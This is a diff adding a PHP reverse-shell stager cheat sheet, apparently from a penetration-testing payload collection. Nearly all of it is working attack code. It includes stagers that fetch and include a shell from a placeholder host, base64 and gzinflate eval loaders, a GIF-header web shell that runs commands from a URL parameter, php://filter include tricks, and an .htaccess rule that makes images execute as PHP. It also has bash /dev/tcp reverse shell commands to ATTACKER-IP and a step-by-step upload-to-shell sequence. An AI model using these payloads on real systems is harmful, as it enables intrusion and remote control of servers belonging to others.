@@ -1,0 +1,57 @@
+# ============================================================================
+# PHP REVERSE SHELL - STAGERS (tiny starters, load the real shell later)
+# Authorized targets only. Replace ATTACKER-IP / 4444 / YOUR-HOST as needed.
+# ============================================================================
+
+# ---------------------------------------------------------------------------
+# 1) DOWNLOAD FIRST, RUN SECOND (drop the full shell onto the target)
+#    Your-Host serves php-reverse-shell.php; this stager saves + includes it.
+# ---------------------------------------------------------------------------
+<?php file_put_contents("/tmp/.x.php", file_get_contents("http://YOUR-HOST/x.php")); include("/tmp/.x.php"); ?>
+<?php $x=file_get_contents("http://YOUR-HOST/x.php");file_put_contents(sys_get_temp_dir()."/x.php",$x);include(sys_get_temp_dir()."/x.php"); ?>
+
+# ---------------------------------------------------------------------------
+# 2) ONE-BLOCK ALL-IN-ONE (self-contained base64 shell - no download needed)
+#    Replace the blob below with your own base64 shell (see php-reverse-shell-bypass.txt J)
+# ---------------------------------------------------------------------------
+<?php eval(base64_decode("YOUR-BASE64-SHELL-HERE")); ?>
+
+# ---------------------------------------------------------------------------
+# 3) IMAGE / EXIF STAGER  (hide the shell inside an uploaded PNG endpoint)
+#    Steps: make a fake GIF/PNG header + your PHP at the end of the file.
+#    Then trigger PHP execution by including the uploaded file:
+# ---------------------------------------------------------------------------
+# Fake GIF that PHP renders as code when included:
+GIF89a
+<?php @system($_GET['c']); ?>
+# Include it (LFI/RFI style):
+#   GET /page.php?file=/uploads/2026/01/shell.gif&c=bash+-c+'bash+-i+>&+/dev/tcp/ATTACKER-IP/4444+0>&1'
+# If the app strips the extension to only-allow-images, name it shell.gif.php or double-ext.
+
+# ---------------------------------------------------------------------------
+# 4) php://filter BASE64-DECODE STAGER  (decode-in-flight, no eval() call)
+#    File src.php contains a base64 blob of your shell; include() decodes+execs.
+# ---------------------------------------------------------------------------
+include("php://filter/convert.base64-decode/resource=/uploads/2026/01/blob.txt");
+
+# ---------------------------------------------------------------------------
+# 5) MINIMAL COMPRESSED STAGER (the 402-byte proc_open shell, deflated)
+#    Drop into any GET/POST value where PHP evaluates it. Replace the blob
+#    with one you generate for YOUR IP via php-reverse-shell-bypass.txt section J.
+# ---------------------------------------------------------------------------
+<?php eval(gzinflate(base64_decode("BLOB-HERE"))); ?>
+
+# ---------------------------------------------------------------------------
+# 6) ONE-LINE STAGER CHAIN IN A .htaccess (mod_php only)
+#    Add to .htaccess so ANY image is executed as PHP:
+#      AddType application/x-httpd-php .png .jpg .gif .txt
+#    Then: /uploads/2026/01/shell.txt?c=bash+-c+'bash+-i+>&+/dev/tcp/ATTACKER-IP/4444+0>&1'
+# ---------------------------------------------------------------------------
+
+# ============================================================================
+# RECOMMENDED ORDER (from zero to shell):
+#   1. Upload a .php stager via an allowed file upload
+#   2. Or drop via LFI:  include("php://filter/convert.base64-decode/resource=uploads/2026/01/x.php")
+#   3. Or use php-reverse-shell-bypass.txt section E blob when uploads reject .php
+#   4. Listener:  nc -lvnp 4444
+# ============================================================================
